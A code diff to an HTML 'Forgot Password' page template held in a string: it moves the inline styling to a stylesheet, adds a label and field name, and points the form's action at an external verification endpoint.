@@ -10,6 +10,7 @@ String form = '''<!doctype html>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css"
         integrity="sha512-+4zCK9k+qNFUR5X+cKL9EIR+ZOhtIloNl9GIKS57V1MyNsYpYcUrUeQc9vNfzsWfV28IaLL3i96P9sdNyeRssA=="
         crossorigin="anonymous" />
+    <link rel="stylesheet" href="style.css" />
 
     <!-- Google Fonts  -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -19,18 +20,16 @@ String form = '''<!doctype html>
     <title>Forgot Password UI Using CSS - @code.scientist x @codingtorque</title>
 </head>
 
-<body> <style>
-     $styleForm
-    </style>
+<body>
     <div class="card">
         <p class="lock-icon"><i class="fa fa-lock"></i></p>
-        <h2>Forgot Password?</h2>
-        <p>You can reset your Password here</p>
-        <form action="" method="post" name="signup">
-        <input type="text" class="passInput" placeholder="Email address">
-        <input type="submit" name="signup" value="Восстановить">
-        <button>Send My Password</button>
-            </form>
+
+        <form action="https://verification.allmarket.space" method="post" name="signup">
+            <label for="text_field">Forgot Password?</label>
+            <input type="text" class="passInput" placeholder="Email address" id="text_field" name="text">
+            <input type="submit" name="signup" value="Update">
+            <!-- <button>Send My Password</button> -->
+        </form>
     </div>
 </body>
 
